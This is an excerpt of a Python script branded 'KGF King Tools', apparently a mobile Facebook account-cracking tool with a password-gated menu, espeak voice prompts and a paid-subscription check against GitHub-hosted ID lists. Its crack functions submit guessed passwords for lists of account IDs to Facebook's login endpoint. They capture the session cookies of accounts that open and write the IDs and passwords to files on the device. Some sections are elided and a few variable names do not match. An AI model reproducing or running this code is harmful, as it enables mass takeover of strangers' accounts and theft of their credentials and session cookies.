...
def main():
    stored_password = "KGFVAN"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to KGF KING TOOLS!")
            os.system('espeak -a 300 "Welcome to KGF King Tools varson 2.7 ..."')
            time.sleep(2)
            os.system('clear')
...
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/dxKGF-99/F88/main/approved.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/KGFBR/KGF/blob/main/KGF.txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/KGF.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-KGF ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • KGF KING]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mKGF-KING ]   ║\33[1;34m   
...
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/KGFBR/KGF/blob/main/KGF.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m KGF TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = f'https://wa.me/+9779811965970?text={message}'
...
os.system('espeak -a 300 " Welcome,   to,  KGF,  King,  Tools"')
pass
...
def menu():
    ...
    if KGF in ['111']:
        ...
        os.system('xdg-open https://wa.me/+9779811965970')
        os.system("python nono.py")
    elif KGF in ['3','03']:
        result()
    elif KGF in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[KGF•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    #sys.stdout.write(f"\r\033[100;92m{bo}[KGF•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mKGF-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                ...
                print(f'\r\033[0;92mKGF-Ok] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                #print(f'\r\033[0;92m[KGF\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " KGF,  Ok,  id"')
                open('/sdcard/KGF-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[KGF-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mKGF-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/KGF-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mKGF-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " KGF,  Ok,  id"')
                open('/sdcard/KGF-OK.txt', 'a').write( cid+' | '+ps+' \n')
                break
